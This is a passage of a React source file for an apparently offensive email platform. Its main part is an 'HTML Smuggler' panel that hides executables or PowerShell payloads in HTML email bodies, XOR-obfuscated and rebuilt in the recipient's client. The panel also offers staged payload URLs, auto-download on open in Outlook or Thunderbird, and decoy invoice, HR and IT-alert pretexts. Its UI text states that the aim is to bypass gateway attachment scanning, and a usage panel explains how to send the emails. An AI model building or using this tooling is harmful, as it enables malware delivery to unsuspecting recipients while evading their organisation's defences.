                      <Label className="text-sm font-medium">Track Clicks</Label>
                      <Switch checked={trackClicks} onCheckedChange={setTrackClicks} />
                    </div>
                  </>
                )}

                <div className="space-y-1">
                  <Label className="text-xs">Campaign</Label>
                  <Select
                    value={campaignId || "__none__"}
                    onValueChange={(val) => setCampaignId(val === "__none__" || val === null ? "" : val)}
                  >
                    <SelectTrigger className="h-8 text-sm">
                      <SelectValue placeholder="No Campaign" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="__none__">No Campaign</SelectItem>
                      {campaigns.map((c) => (
                        <SelectItem key={c.id} value={c.id}>
                          {c.name} ({c.status})
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
              </CardContent>
            </Card>
          </div>

          <Card>
            <CardHeader>
              <CardTitle className="text-sm">Attachment Manager</CardTitle>
              <CardDescription className="text-xs">Manage attachments for bulk emails</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="flex gap-2">
                <input
                  type="file"
                  onChange={handleAttachmentUpload}
                  className="text-xs file:mr-2 file:rounded-md file:border file:border-border file:bg-muted file:px-2 file:py-1 file:text-xs"
                />
              </div>

              {attachments.length > 0 && (
                <div className="space-y-2">
                  <label className="text-xs font-medium text-muted-foreground">Attached Files</label>
                  <div className="space-y-2">
                    {attachments.map((att) => (
                      <div key={att.id} className="flex items-center justify-between p-2 rounded border">
                        <div>
                          <p className="text-sm font-medium">{att.filename}</p>
                          <p className="text-xs text-muted-foreground">
                            {(att.size / 1024).toFixed(1)} KB • {att.contentType}
                          </p>
                        </div>
                        <Button
                          size="sm"
                          variant="destructive"
                          onClick={() => removeAttachment(att.id)}
                        >
                          Remove
                        </Button>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {attachments.length === 0 && (
                <p className="text-xs text-muted-foreground">No attachments added.</p>
              )}
            </CardContent>
          </Card>
        </TabsContent>

        {/* ================================================================ */}
        {/*  SMUGGLER TAB                                                    */}
        {/* ================================================================ */}
        <TabsContent value="smuggler" className="space-y-6">
          <div className="grid gap-6 xl:grid-cols-2">
            {/* Config panel */}
            <Card>
              <CardHeader className="pb-3">
                <CardTitle className="text-sm">HTML Smuggler</CardTitle>
                <CardDescription className="text-xs">
                  Embed or stage a payload inside an HTML email body — payload reconstructed client-side, bypasses gateway attachment scanning.
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                {/* Mode */}
                <div>
                  <label className="block text-xs font-medium mb-1">Mode</label>
                  <div className="flex gap-2">
                    {(["embed", "staged", "pretext-only"] as const).map((m) => (
                      <button
                        key={m}
                        onClick={() => setSmugMode(m)}
                        className={cn(
                          "flex-1 rounded-md border px-3 py-2 text-xs font-medium transition-colors",
                          smugMode === m
                            ? "border-primary bg-primary/10 text-primary"
                            : "border-border hover:border-primary/50",
                        )}
                      >
                        {m === "embed" ? "Embed" : m === "staged" ? "Staged Pull" : "Pretext Only"}
                      </button>
                    ))}
                  </div>
                  <p className="mt-1.5 text-xs text-muted-foreground">
                    {smugMode === "embed" && "Payload base64 is XOR-encoded and reconstructed via JS in the email client."}
                    {smugMode === "staged" && "Email fetches payload from URL on open/click — payload never touches the email."}
                    {smugMode === "pretext-only" && "Returns only the decoy HTML body without any payload attachment."}
                  </p>
                </div>

                {/* Payload input */}
                {smugMode === "embed" && (
                  <div className="space-y-2">
                    <label className="block text-xs font-medium">Payload File *</label>
                    {/* Drop zone */}
                    <label
                      className={cn(
                        "flex cursor-pointer flex-col items-center justify-center gap-1.5 rounded-md border-2 border-dashed px-4 py-5 transition-colors",
                        smugPayloadB64
                          ? "border-primary/40 bg-primary/5"
                          : "border-border hover:border-primary/50 hover:bg-muted/30",
                      )}
                    >
                      <input
                        type="file"
                        className="sr-only"
                        onChange={(e) => {
                          const file = e.target.files?.[0]
                          if (!file) return
                          const reader = new FileReader()
                          reader.onload = () => {
                            const b64 = btoa(
                              new Uint8Array(reader.result as ArrayBuffer)
                                .reduce((s, b) => s + String.fromCharCode(b), ""),
                            )
                            setSmugPayloadB64(b64)
                            if (!smugFilename || smugFilename === "invoice.pdf") {
                              setSmugFilename(file.name)
                            }
                            toast.success(`Loaded ${file.name}`, {
                              description: `${(file.size / 1024).toFixed(1)} KB → base64 encoded`,
                            })
                          }
                          reader.readAsArrayBuffer(file)
                          e.target.value = ""
                        }}
                      />
                      {smugPayloadB64 ? (
                        <>
                          <span className="text-xs font-medium text-primary">✓ Payload loaded</span>
                          <span className="text-xs text-muted-foreground">{Math.ceil(smugPayloadB64.length * 0.75 / 1024)} KB raw · {(smugPayloadB64.length / 1024).toFixed(1)} KB base64</span>
                          <button
                            type="button"
                            onClick={(e) => { e.preventDefault(); setSmugPayloadB64("") }}
                            className="mt-1 text-xs text-destructive hover:underline"
                          >
                            Clear
                          </button>
                        </>
                      ) : (
                        <>
                          <span className="text-xs font-medium">Drop file here or click to browse</span>
                          <span className="text-xs text-muted-foreground">.ps1 · .exe · .bin · .py · any file</span>
                          <span className="text-xs text-muted-foreground">Auto base64-encoded in browser — never uploaded to server until you click Generate</span>
                        </>
                      )}
                    </label>
                  </div>
                )}

                {smugMode === "staged" && (
                  <div>
                    <Label className="text-xs font-medium mb-1 block">Payload URL *</Label>
                    <Input
                      value={smugPayloadUrl}
                      onChange={(e) => setSmugPayloadUrl(e.target.value)}
                      className="h-7 text-xs"
                      placeholder="https://your-node.example.com/payload.ps1"
                    />
                    <p className="mt-1 text-xs text-muted-foreground">
                      Host your payload on a node — the email fetches it on open/click.
                    </p>
                  </div>
                )}

                {/* Filename */}
                {smugMode !== "pretext-only" && (
                  <div>
                    <Label className="text-xs font-medium mb-1 block">Filename</Label>
                    <Input
                      value={smugFilename}
                      onChange={(e) => setSmugFilename(e.target.value)}
                      className="h-7 text-xs"
                      placeholder="invoice.pdf"
                    />
                  </div>
                )}

                {/* Pretext */}
                <div>
                  <Label className="text-xs font-medium mb-1 block">Pretext Template</Label>
                  <Select
                    value={smugPretext || "__none__"}
                    onValueChange={(val) => setSmugPretext(val === "__none__" || val === null ? "" : val as any)}
                  >
                    <SelectTrigger className="h-7 text-xs">
                      <SelectValue placeholder="— None (use custom decoy HTML) —" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="__none__">— None (use custom decoy HTML) —</SelectItem>
                      <SelectItem value="invoice">Invoice / Billing</SelectItem>
                      <SelectItem value="hr_policy">HR Policy Update</SelectItem>
                      <SelectItem value="it_alert">IT Security Alert</SelectItem>
                      <SelectItem value="contract">Contract Review</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                {/* Custom decoy HTML override */}
                {smugMode !== "pretext-only" && (
                  <div>
                    <Label className="text-xs font-medium mb-1 block">Custom Decoy HTML <span className="text-muted-foreground">(overrides pretext)</span></Label>
                    <Textarea
                      value={smugDecoyHtml}
                      onChange={(e) => setSmugDecoyHtml(e.target.value)}
                      rows={3}
                      className="text-xs font-mono resize-none"
                      placeholder="<p>Please see attached.</p>"
                    />
                  </div>
                )}

                {/* XOR key (embed only) */}
                {smugMode === "embed" && (
                  <div>
                    <Label className="text-xs font-medium mb-1 block">XOR Obfuscation Key <span className="text-muted-foreground">(1–255, optional)</span></Label>
                    <Input
                      value={smugXorKey}
                      onChange={(e) => setSmugXorKey(e.target.value)}
                      type="number"
                      min={1}
                      max={255}
                      className="h-7 text-xs"
                      placeholder="e.g. 42 — hides raw PE/ELF bytes in email source"
                    />
                  </div>
                )}

                {/* Auto-download toggle */}
                {smugMode !== "pretext-only" && (
                  <div className="flex items-center justify-between rounded-md border border-border px-3 py-2">
                    <div>
                      <p className="text-xs font-medium">Auto-download on open</p>
                      <p className="text-xs text-muted-foreground">Triggers download immediately on email open (Outlook Desktop, Thunderbird)</p>
                    </div>
                    <Switch
                      checked={smugAutoDownload}
                      onCheckedChange={setSmugAutoDownload}
                    />
                  </div>
                )}

                {/* Download link text */}
                {smugMode !== "pretext-only" && !smugAutoDownload && (
                  <div>
                    <Label className="text-xs font-medium mb-1 block">Button / Link Text</Label>
                    <Input
                      value={smugLinkText}
                      onChange={(e) => setSmugLinkText(e.target.value)}
                      className="h-7 text-xs"
                      placeholder="Download Invoice"
                    />
                  </div>
                )}

                <Button
                  onClick={generateSmuggled}
                  disabled={smugLoading}
                  className="w-full"
                >
                  {smugLoading ? "Generating…" : "Generate Smuggled HTML"}
                </Button>
              </CardContent>
            </Card>

            {/* Output panel */}
            <Card>
              <CardHeader className="pb-3">
                <div className="flex items-center justify-between">
                  <div>
                    <CardTitle className="text-sm">Generated Output</CardTitle>
                    <CardDescription className="text-xs">
                      Use this HTML as the email body — do <strong>not</strong> add payload as an attachment.
                    </CardDescription>
                  </div>
                  {smugResult && (
                    <div className="flex items-center gap-2">
                      <Badge variant="outline" className="text-xs tabular-nums">
                        {(smugResult.sizeBytes / 1024).toFixed(1)} KB
                      </Badge>
                      <Badge variant="outline" className="text-xs">
                        {smugResult.mode ?? smugMode}
                      </Badge>
                    </div>
                  )}
                </div>
              </CardHeader>
              <CardContent className="space-y-3">
                {!smugResult && (
                  <div className="flex items-center justify-center rounded-md border border-dashed border-border py-16">
                    <p className="text-xs text-muted-foreground">Output will appear here after generation.</p>
                  </div>
                )}
                {smugResult && (
                  <>
                    <div className="flex gap-2">
                      <Button
                        size="sm"
                        variant="outline"
                        className="flex-1 text-xs"
                        onClick={() => {
                          navigator.clipboard.writeText(smugResult.html)
                          toast.success("HTML copied to clipboard")
                        }}
                      >
                        Copy HTML
                      </Button>
                      <Button
                        size="sm"
                        variant="outline"
                        className="flex-1 text-xs"
                        onClick={() => {
                          const blob = new Blob([smugResult.html], { type: "text/html" })
                          const url = URL.createObjectURL(blob)
                          const a = document.createElement("a")
                          a.href = url
                          a.download = "smuggled-email.html"
                          a.click()
                          URL.revokeObjectURL(url)
                        }}
                      >
                        Download .html
                      </Button>
                    </div>
                    <Textarea
                      readOnly
                      value={smugResult.html}
                      rows={20}
                      className="bg-muted/30 font-mono text-xs resize-none"
                    />
                    <div className="rounded-md border border-amber-500/30 bg-amber-500/5 p-3">
                      <p className="text-xs font-medium text-amber-600 dark:text-amber-400">Usage</p>
                      <ol className="mt-1 space-y-1 text-xs text-muted-foreground list-decimal list-inside">
                        <li>Paste this HTML as the <strong>email body</strong> in your mail client or campaign tool.</li>
                        <li>Do <strong>not</strong> add the payload as a MIME attachment — that defeats the purpose.</li>
                        <li>Send via the Accounts tab SMTP config or your campaign tool.</li>
                        {smugMode === "embed" && <li>Payload reconstructs and downloads when the email is opened in Outlook / Thunderbird.</li>}
                        {smugMode === "staged" && <li>Payload is fetched from <code className="text-xs">{smugPayloadUrl || "your URL"}</code> on click/open — ensure the endpoint is live.</li>}
                      </ol>
                    </div>
                  </>
                )}
              </CardContent>
            </Card>
          </div>
        </TabsContent>
      </Tabs>
    </div>
  )
}
